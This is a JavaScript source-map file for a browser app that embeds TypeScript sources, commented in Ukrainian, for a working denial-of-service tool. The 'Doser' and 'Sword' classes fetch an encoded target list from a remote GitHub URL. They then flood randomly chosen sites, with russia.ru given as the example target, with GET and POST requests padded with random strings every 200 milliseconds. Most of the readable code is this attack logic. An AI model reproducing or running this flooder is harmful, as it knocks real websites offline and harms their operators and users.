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","file":"main.min.js","sourcesContent":["if (navigator.serviceWorker) {\n\t$(window).on('load', () => {\n\t\tnavigator.serviceWorker.register('sw.js').then(\n\t\t\t() => {\n\t\t\t\tconsole.log('ServiceWorker registered succesfully!');\n\t\t\t},\n\t\t\t(err: Error) => {\n\t\t\t\tconsole.log(`ServiceWorker registration failed, ${err}`);\n\t\t\t}\n\t\t);\n\t});\n}\n","/*!\nMIT License\n\nCopyright (c) 2022-2023 Yuriy Bogdan\n*/\nvar __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {\n    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nvar _a;\n// ========== Polyfills ====================\nif (!(navigator === null || navigator === void 0 ? void 0 : navigator.getBattery) && (navigator === null || navigator === void 0 ? void 0 : navigator.battery)) {\n    navigator.getBattery = () => __awaiter(this, void 0, void 0, function* () { return navigator.battery; });\n}\n// =========================================\n// ======== Constants and objects ==========\nconst targetSource = 'https://raw.githubusercontent.com/xzyallzjx-231/iouzjla-612/main/40.json';\n/**\n * База данних **localStorage**\n *\n * Данні зберігаються в пам'яті пристрою, досить схоже на **Cookies**\n */\nconst Database = localStorage;\n/**\n * Пристрій\n *\n * @example Decice.cores // 8\n */\nconst Device = {\n    /**\n     * Батарея пристрою\n     *\n     * @example Device.battery // BatteryManager {...}\n     */\n    battery: navigator.battery || navigator.getBattery(),\n    /**\n     * Данні про підключення до **Інтернету**\n     *\n     * @example Device.connection // NetworkInformation {...}\n     */\n    connection: navigator.connection,\n    /**\n     * Статус мережі\n     *\n     * @example Device.onLine // true\n     */\n    onLine: navigator.onLine,\n    /**\n     * Кількість ядер в процесорі\n     *\n     * @example Device.cores // 8\n     */\n    cores: navigator.hardwareConcurrency,\n    /**\n     * Агент користувача\n     *\n     * @example Device.userAgent // 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0'\n     */\n    userAgent: navigator.userAgent,\n    /**\n     * Чи являється пристрій телефоном\n     *\n     * @example Device.isPhone // false\n     */\n    isPhone: (_a = navigator.userAgentData) === null || _a === void 0 ? void 0 : _a.mobile,\n    /**\n     * Продуктивність пристрою\n     *\n     * @example Device.performance // Performance {...}\n     */\n    performance: performance,\n};\n/**\n * Звукові ефекти **(SFX)**\n *\n * - click\n *\n * @example Sounds.click.play() // [Звук]\n */\nconst Sounds = {\n    click: new Audio('sounds/click.mp3'),\n};\n/** Керування панеллю **(main > .panel)** */\nclass Panel {\n    constructor() {\n        this.button = $('#button');\n    }\n    /**\n     * Змінити текст кнопки\n     *\n     * @param {ButtonText} text - Текст кнопки\n     */\n    buttonText(text) {\n        this.button.text(text);\n    }\n    /**\n     * Заблокувати кнопку старту для користувача\n     *\n     * Це робиться задля уникнення багу з нескінченними циклами (коли під час завантаження цілей користувач натискав кнопку - створювався другий цикл атаки, який неможливо спинити)\n     */\n    lockButton() {\n        this.button.attr('disabled', true);\n    }\n    /**\n     * Розблокувати кнопку старту для користувача\n     *\n     * Це робиться задля уникнення багу з нескінченними циклами (коли під час завантаження цілей користувач натискав кнопку - створювався другий цикл атаки, який неможливо спинити)\n     */\n    unlockButton() {\n        this.button.attr('disabled', false);\n    }\n    /**\n     * Показати ціль, яку ми зараз атакуємо\n     *\n     * @param {Target} target - Ціль\n     */\n    showCurrentTarget(target) {\n        $('.target-page').text(target.page);\n        $('.target-method').text(target.method);\n    }\n    /**\n     * Оновити запис кількості атак і показати їх кількість користувачу\n     */\n    increaseAttacksCounter() {\n        // Збереження кількості всіх атак в сховищі\n        Database.attacks++;\n        const previousAttacks = parseInt($('#attacks').text());\n        $('#attacks').text(previousAttacks + 1);\n    }\n}\n// =========================================\n// ========== Random utils =================\n/**\n * Рандомне число від 0 до n\n *\n * @example getRandomInt(50) // 27\n * @param {number} num - До\n * @returns {number} Рандомне число\n */\nconst getRandomInt = (num) => Math.floor(Math.random() * num); // Рандомне ціле число\n/**\n * Рандомний елемент з массиву\n *\n * @example randomChoice(['foo', 'bar', 'zoo']) // 'bar'\n * @example randomChoice('fooBarZoo') // 'o'\n * @param {array | string} array - Массив\n * @returns {*} Рандомний елемент з массиву\n */\nconst randomChoice = (array) => array[getRandomInt(array.length)];\n// =========================================\n// ========= Custom errors =================\nclass TargetsFetchingError extends Error {\n    constructor() {\n        super('Failed fetching targets');\n        this.name = 'TargetsFetchingError';\n    }\n}\nclass EmptyTargetsList extends Error {\n    constructor() {\n        super('Targets list is empty');\n        this.name = 'EmptyTargetsList';\n    }\n}\nclass TargetsEncodingError extends Error {\n    constructor() {\n        super('Targets encoding failed');\n        this.name = 'TargetsEncodingError';\n    }\n}\n// =========================================\n","/*!\nMIT License\n\nCopyright (c) 2022-2023 Yuriy Bogdan\n*/\n\n// ========== Polyfills ====================\nif (!navigator?.getBattery && navigator?.battery) {\n\tnavigator.getBattery = async () => navigator.battery;\n}\n// =========================================\n\n// ======== Constants and objects ==========\nconst targetSource =\n\t'https://raw.githubusercontent.com/xzyallzjx-231/iouzjla-612/main/40.json';\n\n/**\n * База данних **localStorage**\n *\n * Данні зберігаються в пам'яті пристрою, досить схоже на **Cookies**\n */\nconst Database = localStorage;\n\n/**\n * Пристрій\n *\n * @example Decice.cores // 8\n */\nconst Device = {\n\t/**\n\t * Батарея пристрою\n\t *\n\t * @example Device.battery // BatteryManager {...}\n\t */\n\tbattery: navigator.battery || navigator.getBattery(),\n\n\t/**\n\t * Данні про підключення до **Інтернету**\n\t *\n\t * @example Device.connection // NetworkInformation {...}\n\t */\n\tconnection: navigator.connection,\n\n\t/**\n\t * Статус мережі\n\t *\n\t * @example Device.onLine // true\n\t */\n\tonLine: navigator.onLine,\n\n\t/**\n\t * Кількість ядер в процесорі\n\t *\n\t * @example Device.cores // 8\n\t */\n\tcores: navigator.hardwareConcurrency,\n\n\t/**\n\t * Агент користувача\n\t *\n\t * @example Device.userAgent // 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0'\n\t */\n\tuserAgent: navigator.userAgent,\n\t/**\n\t * Чи являється пристрій телефоном\n\t *\n\t * @example Device.isPhone // false\n\t */\n\tisPhone: navigator.userAgentData?.mobile,\n\n\t/**\n\t * Продуктивність пристрою\n\t *\n\t * @example Device.performance // Performance {...}\n\t */\n\tperformance: performance,\n};\n\n/**\n * Звукові ефекти **(SFX)**\n *\n * - click\n *\n * @example Sounds.click.play() // [Звук]\n */\nconst Sounds = {\n\tclick: new Audio('sounds/click.mp3'),\n};\n\n/** Керування панеллю **(main > .panel)** */\nclass Panel {\n\t[x: string]: any;\n\n\tconstructor() {\n\t\tthis.button = $('#button');\n\t}\n\n\t/**\n\t * Змінити текст кнопки\n\t *\n\t * @param {ButtonText} text - Текст кнопки\n\t */\n\tbuttonText(text: ButtonText) {\n\t\tthis.button.text(text);\n\t}\n\n\t/**\n\t * Заблокувати кнопку старту для користувача\n\t *\n\t * Це робиться задля уникнення багу з нескінченними циклами (коли під час завантаження цілей користувач натискав кнопку - створювався другий цикл атаки, який неможливо спинити)\n\t */\n\tlockButton() {\n\t\tthis.button.attr('disabled', true);\n\t}\n\n\t/**\n\t * Розблокувати кнопку старту для користувача\n\t *\n\t * Це робиться задля уникнення багу з нескінченними циклами (коли під час завантаження цілей користувач натискав кнопку - створювався другий цикл атаки, який неможливо спинити)\n\t */\n\tunlockButton() {\n\t\tthis.button.attr('disabled', false);\n\t}\n\n\t/**\n\t * Показати ціль, яку ми зараз атакуємо\n\t *\n\t * @param {Target} target - Ціль\n\t */\n\tshowCurrentTarget(target: Target) {\n\t\t$('.target-page').text(target.page);\n\t\t$('.target-method').text(target.method);\n\t}\n\n\t/**\n\t * Оновити запис кількості атак і показати їх кількість користувачу\n\t */\n\tincreaseAttacksCounter() {\n\t\t// Збереження кількості всіх атак в сховищі\n\t\tDatabase.attacks++;\n\n\t\tconst previousAttacks = parseInt($('#attacks').text());\n\n\t\t$('#attacks').text(previousAttacks + 1);\n\t}\n}\n\n// =========================================\n\n// ========== Random utils =================\n/**\n * Рандомне число від 0 до n\n *\n * @example getRandomInt(50) // 27\n * @param {number} num - До\n * @returns {number} Рандомне число\n */\nconst getRandomInt = (num: number): number => Math.floor(Math.random() * num); // Рандомне ціле число\n\n/**\n * Рандомний елемент з массиву\n *\n * @example randomChoice(['foo', 'bar', 'zoo']) // 'bar'\n * @example randomChoice('fooBarZoo') // 'o'\n * @param {array | string} array - Массив\n * @returns {*} Рандомний елемент з массиву\n */\nconst randomChoice = (array: Array<any> | string): any =>\n\tarray[getRandomInt(array.length)];\n// =========================================\n\n// ========= Custom errors =================\nclass TargetsFetchingError extends Error {\n\tconstructor() {\n\t\tsuper('Failed fetching targets');\n\t\tthis.name = 'TargetsFetchingError';\n\t}\n}\n\nclass EmptyTargetsList extends Error {\n\tconstructor() {\n\t\tsuper('Targets list is empty');\n\t\tthis.name = 'EmptyTargetsList';\n\t}\n}\n\nclass TargetsEncodingError extends Error {\n\tconstructor() {\n\t\tsuper('Targets encoding failed');\n\t\tthis.name = 'TargetsEncodingError';\n\t}\n}\n// =========================================\n","/*!\nMIT License\n\nCopyright (c) 2022-2023 Yuriy Bogdan\n*/\nvar __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {\n    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\n// @ts-nocheck\n/**\n * Інструменти для досера ({@link Doser})\n *\n * - getFlood\n * - getTargets\n */\nconst Tools = {\n    charSet: 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890',\n    /**\n     * Отримати флуд\n     *\n     * @example Tools.getFlood(12) // 'YOt4umytz56I'\n     *\n     * @param {number} lenght Об'єм флуду (в кількості символів)\n     * @returns {string} Флуд\n     */\n    getFlood(lenght) {\n        let flood = '';\n        for (let i = 0; i < lenght; i++) {\n            flood += randomChoice(this.charSet);\n        }\n        return flood;\n    },\n    /**\n     * Отримання цілей для атаки\n     *\n     * Беруться цілі, для яких в нас є **потрібний метод** для атаки\n     *\n     * @example\n     * await Tools.getTargets()\n     * [\n     *   {\n     *     \"page\": \"https://russia.ru\",\n     *     \"method\": \"get\"\n     *   },\n     *   ...\n     * ]\n     *\n     * @param {string[]} supportedMethods - Методи, якими ми можемо атакувати\n     * @returns {Promise<Target[]>} **Відфільтровані цілі** (вилучаються цілі, для яких треба _специфічні_ методи атаки)\n     */\n    getTargets(supportedMethods) {\n        return __awaiter(this, void 0, void 0, function* () {\n            return new Promise((resolve, reject) => __awaiter(this, void 0, void 0, function* () {\n                return yield fetch(targetSource, {\n                    cache: 'no-cache',\n                })\n                    .then((response) => __awaiter(this, void 0, void 0, function* () {\n                    if (response) {\n                        const responseText = yield response.text();\n                        /** @type {Target[]} */\n                        let encodedData;\n                        try {\n                            encodedData = JSON.parse(atob(responseText));\n                        }\n                        catch (e) {\n                            reject(new TargetsEncodingError());\n                        }\n                        if (encodedData.length != 0) {\n                            /** @type {Target[]} */\n                            let filteredTargets = [];\n                            for (let target of encodedData) {\n                                supportedMethods.includes(target.method) &&\n                                    filteredTargets.push(target);\n                            }\n                            resolve(filteredTargets);\n                        }\n                        else {\n                            reject(new EmptyTargetsList());\n                        }\n                    }\n                }))\n                    .catch(() => {\n                    reject(new TargetsFetchingError());\n                });\n            }));\n        });\n    },\n};\nclass Sword {\n    constructor() {\n        this.defaultRequestParams = {\n            cache: 'no-cache',\n            referrerPolicy: 'no-referrer',\n            mode: 'no-cors',\n        };\n    }\n    attack(target) {\n        return __awaiter(this, void 0, void 0, function* () {\n            return yield this[target.method](target);\n        });\n    }\n    request(url, data) {\n        return __awaiter(this, void 0, void 0, function* () {\n            return yield fetch(url, Object.assign(Object.assign({}, this.defaultRequestParams), data));\n        });\n    }\n    get(target) {\n        return __awaiter(this, void 0, void 0, function* () {\n            let page = target.page;\n            if (!page.includes('?')) {\n                page += '/' + Tools.getFlood(64);\n            }\n            return yield this.request(page, {\n                method: 'GET',\n            });\n        });\n    }\n    post(target) {\n        return __awaiter(this, void 0, void 0, function* () {\n            return yield this.request(target.page, {\n                method: 'POST',\n                body: Tools.getFlood(128),\n            });\n        });\n    }\n}\nclass Doser {\n    constructor() {\n        this.attack = false;\n        this.speed = 200;\n        this.supportedAttackMethods = ['post', 'get'];\n    }\n    run() {\n        return __awaiter(this, void 0, void 0, function* () {\n            this.attack ? this.stop() : this.start();\n        });\n    }\n    start() {\n        return __awaiter(this, void 0, void 0, function* () {\n            if (!this.attack) {\n                Panel.buttonText('Стоп');\n                Sounds.click.play();\n                this.attack = true;\n                Panel.lockButton();\n                yield Tools.getTargets(this.supportedAttackMethods)\n                    .then((targets) => __awaiter(this, void 0, void 0, function* () {\n                    // Атакоцикл, брум-брум! 😂\n                    this.attackCycle = setInterval(() => __awaiter(this, void 0, void 0, function* () {\n                        const randomTarget = randomChoice(targets);\n                        Panel.showCurrentTarget(randomTarget);\n                        Sword.attack(randomTarget);\n                        Panel.increaseAttacksCounter();\n                    }), this.speed);\n                    Panel.unlockButton();\n                }))\n                    .catch((err) => {\n                    console.log(err);\n                    switch (err.name) {\n                        case 'TargetsFetchingError':\n                            Swal.fire('Помилка', 'Не вдалось завантажити цілі', 'error');\n                            break;\n                        case 'EmptyTargetsList':\n                            Swal.fire('Повідомлення', 'Список цілей порожній, можемо відпочивати)', 'success');\n                            break;\n                        case 'TargetsEncodingError':\n                            Swal.fire('Помилка', 'Не вдалось розшифрувати цілі, повідомте про це розробнику', 'error');\n                            break;\n                    }\n                    Panel.unlockButton();\n                    Panel.buttonText('Старт!');\n                    this.attack = false;\n                });\n            }\n        });\n    }\n    /** Зупинка атаки */\n    stop() {\n        clearInterval(this.attackCycle);\n        this.attack = false;\n        console.clear();\n        Sounds.click.play();\n        Panel.buttonText('Старт!');\n    }\n}\n","/*!\nMIT License\n\nCopyright (c) 2022-2023 Yuriy Bogdan\n*/\n\n// @ts-nocheck\n\n/**\n * Інструменти для досера ({@link Doser})\n *\n * - getFlood\n * - getTargets\n */\nconst Tools = {\n\tcharSet: 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890',\n\n\t/**\n\t * Отримати флуд\n\t *\n\t * @example Tools.getFlood(12) // 'YOt4umytz56I'\n\t *\n\t * @param {number} lenght Об'єм флуду (в кількості символів)\n\t * @returns {string} Флуд\n\t */\n\tgetFlood(lenght: number): string {\n\t\tlet flood = '';\n\n\t\tfor (let i = 0; i < lenght; i++) {\n\t\t\tflood += randomChoice(this.charSet);\n\t\t}\n\t\treturn flood;\n\t},\n\t/**\n\t * Отримання цілей для атаки\n\t *\n\t * Беруться цілі, для яких в нас є **потрібний метод** для атаки\n\t *\n\t * @example\n\t * await Tools.getTargets()\n\t * [\n\t *   {\n\t *     \"page\": \"https://russia.ru\",\n\t *     \"method\": \"get\"\n\t *   },\n\t *   ...\n\t * ]\n\t *\n\t * @param {string[]} supportedMethods - Методи, якими ми можемо атакувати\n\t * @returns {Promise<Target[]>} **Відфільтровані цілі** (вилучаються цілі, для яких треба _специфічні_ методи атаки)\n\t */\n\tasync getTargets(supportedMethods: string[]): Promise<Target[]> {\n\t\treturn new Promise(\n\t\t\tasync (resolve, reject) =>\n\t\t\t\tawait fetch(targetSource, {\n\t\t\t\t\tcache: 'no-cache',\n\t\t\t\t})\n\t\t\t\t\t.then(async (response) => {\n\t\t\t\t\t\tif (response) {\n\t\t\t\t\t\t\tconst responseText = await response.text();\n\t\t\t\t\t\t\t/** @type {Target[]} */\n\t\t\t\t\t\t\tlet encodedData;\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tencodedData = JSON.parse(atob(responseText));\n\t\t\t\t\t\t\t} catch (e) {\n\t\t\t\t\t\t\t\treject(new TargetsEncodingError());\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tif (encodedData.length != 0) {\n\t\t\t\t\t\t\t\t/** @type {Target[]} */\n\t\t\t\t\t\t\t\tlet filteredTargets = [];\n\n\t\t\t\t\t\t\t\tfor (let target of encodedData) {\n\t\t\t\t\t\t\t\t\tsupportedMethods.includes(target.method) &&\n\t\t\t\t\t\t\t\t\t\tfilteredTargets.push(target);\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tresolve(filteredTargets);\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\treject(new EmptyTargetsList());\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t})\n\t\t\t\t\t.catch(() => {\n\t\t\t\t\t\treject(new TargetsFetchingError());\n\t\t\t\t\t})\n\t\t);\n\t},\n};\n\nclass Sword {\n\tprivate defaultRequestParams = {\n\t\tcache: 'no-cache',\n\t\treferrerPolicy: 'no-referrer',\n\t\tmode: 'no-cors',\n\t};\n\n\tasync attack(target: Target) {\n\t\treturn await this[target.method](target);\n\t}\n\n\tprivate async request(url: string, data: any) {\n\t\treturn await fetch(url, {\n\t\t\t...this.defaultRequestParams,\n\t\t\t...data,\n\t\t});\n\t}\n\n\tasync get(target: Target) {\n\t\tlet page = target.page;\n\n\t\tif (!page.includes('?')) {\n\t\t\tpage += '/' + Tools.getFlood(64);\n\t\t}\n\n\t\treturn await this.request(page, {\n\t\t\tmethod: 'GET',\n\t\t});\n\t}\n\n\tasync post(target: Target) {\n\t\treturn await this.request(target.page, {\n\t\t\tmethod: 'POST',\n\t\t\tbody: Tools.getFlood(128),\n\t\t});\n\t}\n}\n\nclass Doser {\n\t/** Статус атаки (чи йде зараз атака) */\n\tprivate attack: boolean;\n\n\t/** Інтервал між атаками (в _мілісекундах_) */\n\tprivate speed: number;\n\n\t/** Підтримувані методи, якими ми можемо атакувати */\n\tprivate supportedAttackMethods: string[];\n\n\t/** Цикл атаки */\n\tprivate attackCycle: number;\n\n\tconstructor() {\n\t\tthis.attack = false;\n\t\tthis.speed = 200;\n\t\tthis.supportedAttackMethods = ['post', 'get'];\n\t}\n\n\tasync run() {\n\t\tthis.attack ? this.stop() : this.start();\n\t}\n\n\tasync start() {\n\t\tif (!this.attack) {\n\t\t\tPanel.buttonText('Стоп');\n\t\t\tSounds.click.play();\n\t\t\tthis.attack = true;\n\n\t\t\tPanel.lockButton();\n\t\t\tawait Tools.getTargets(this.supportedAttackMethods)\n\t\t\t\t.then(async (targets) => {\n\t\t\t\t\t// Атакоцикл, брум-брум! 😂\n\t\t\t\t\tthis.attackCycle = setInterval(async () => {\n\t\t\t\t\t\tconst randomTarget = randomChoice(targets);\n\n\t\t\t\t\t\tPanel.showCurrentTarget(randomTarget);\n\n\t\t\t\t\t\tSword.attack(randomTarget);\n\t\t\t\t\t\tPanel.increaseAttacksCounter();\n\t\t\t\t\t}, this.speed);\n\t\t\t\t\tPanel.unlockButton();\n\t\t\t\t})\n\t\t\t\t.catch((err: Error) => {\n\t\t\t\t\tconsole.log(err);\n\n\t\t\t\t\tswitch (err.name) {\n\t\t\t\t\t\tcase 'TargetsFetchingError':\n\t\t\t\t\t\t\tSwal.fire(\n\t\t\t\t\t\t\t\t'Помилка',\n\t\t\t\t\t\t\t\t'Не вдалось завантажити цілі',\n\t\t\t\t\t\t\t\t'error'\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t\tcase 'EmptyTargetsList':\n\t\t\t\t\t\t\tSwal.fire(\n\t\t\t\t\t\t\t\t'Повідомлення',\n\t\t\t\t\t\t\t\t'Список цілей порожній, можемо відпочивати)',\n\t\t\t\t\t\t\t\t'success'\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t\tcase 'TargetsEncodingError':\n\t\t\t\t\t\t\tSwal.fire(\n\t\t\t\t\t\t\t\t'Помилка',\n\t\t\t\t\t\t\t\t'Не вдалось розшифрувати цілі, повідомте про це розробнику',\n\t\t\t\t\t\t\t\t'error'\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tPanel.unlockButton();\n\t\t\t\t\tPanel.buttonText('Старт!');\n\t\t\t\t\tthis.attack = 